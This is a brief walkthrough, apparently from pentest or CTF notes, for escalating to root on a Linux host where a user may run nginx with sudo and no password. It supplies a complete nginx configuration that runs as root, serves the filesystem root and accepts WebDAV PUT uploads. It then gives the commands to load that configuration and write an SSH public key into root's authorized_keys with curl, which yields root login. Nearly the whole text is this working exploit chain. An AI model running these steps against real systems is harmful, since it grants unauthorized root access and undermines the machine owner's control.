**The Nginx binary needs to be set with sudo permissions for this to work**

* Check sudo permissions with `sudo -l`
	* you should see something similar to this:
```bash
User user may run the following commands on host:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
* If this is set you can begin with creating an nginx configuration file
	* The configuration file will be hosted using nginx as the root user for us to call to later
```nginx conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
```
* Save this as a `.conf` file and upload/save it to the box you are exploiting
	* depending on the type of shell that you have, uploading this to a self hosted web server and curling for it may be the easiest option
* Load the configuration file to nginx with `sudo nginx -c /tmp/nginx_pwn.conf`
* Then, generate yourself a pair of ssh keys using `ssh-keygen`
	* This will be how we authenticate to the root user
* Upload the public key to the newly spun up nginx webserver with:
```bash
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
```
* Finally, ssh into the root user of the box